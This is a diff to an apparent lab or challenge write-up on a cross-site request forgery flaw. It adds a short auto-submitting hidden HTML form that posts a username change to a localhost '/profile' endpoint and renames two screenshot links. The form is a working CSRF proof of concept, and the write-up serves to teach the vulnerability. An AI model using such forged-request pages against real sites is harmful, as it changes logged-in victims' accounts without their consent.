@@ -8,13 +8,24 @@ Missing CSRF token and SameSite cookie protection allows cross-origin state-chan
 
 ## Methodology
 
-Created a simple HTML form that submits a POST request to the `/profile` endpoint and hosted it. When a logged-in victim visits the malicious page, it sends a username change request cross-origin to the server.
+Created a simple HTML form that submits a POST request to the `/profile` endpoint and hosted it.
 
-![CSRF attack page](../assets/24-csrf-1.png)
+```
+<form action="http://localhost:3000/profile" method="POST">
+<input type=hidden name="username" value="test"/>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+```
 
-The username was changed successfully — challenge solved.
+When a logged-in victim visits the malicious page, it sends a username change request cross-origin to the server.
 
-![CSRF challenge complete](../assets/24-csrf-2.png)
+![CSRF attack page](../assets/img-087.png)
+
+The username was changed successfully and challenge solved.
+
+![CSRF challenge complete](../assets/img-088.png)
 
 ## Vulnerability Explanation
 
